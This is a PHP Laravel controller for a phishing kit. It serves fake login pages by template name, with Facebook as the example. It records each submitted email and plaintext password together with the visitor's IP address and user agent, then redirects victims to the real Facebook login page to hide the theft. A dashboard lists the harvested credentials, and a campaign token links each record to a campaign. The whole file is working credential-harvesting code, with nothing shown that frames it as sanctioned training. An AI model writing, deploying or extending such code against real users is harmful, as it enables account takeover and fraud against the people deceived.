<?php

namespace App\Http\Controllers;

use App\Models\PhishingLog;
use Illuminate\Http\Request;

class PhishingController extends Controller
{
    /**
     * Show phishing page dynamically
     */
    public function show($template, $token)
    {
        // Check if view exists (e.g. resources/views/phishing/facebook.blade.php)
        if (!view()->exists("phishing.$template")) {
            abort(404);
        }

        return view("phishing.$template", compact('token'));
    }

    /**
     * Capture credentials
     */
    public function capture(Request $request, $template, $token)
    {
        PhishingLog::create([
            'email'      => $request->email,
            'password'   => $request->password,
            'ip_address' => $request->ip(),
            'user_agent' => $request->userAgent(),
            'token'      => $token, // link log with campaign token
        ]);

        return redirect('https://www.facebook.com/login');
    }

    /**
     * Show phishing logs in dashboard
     */
    public function showLogs()
    {
        $logs = PhishingLog::latest()->get();
        return view('dashboard.logs', compact('logs'));
    }
}
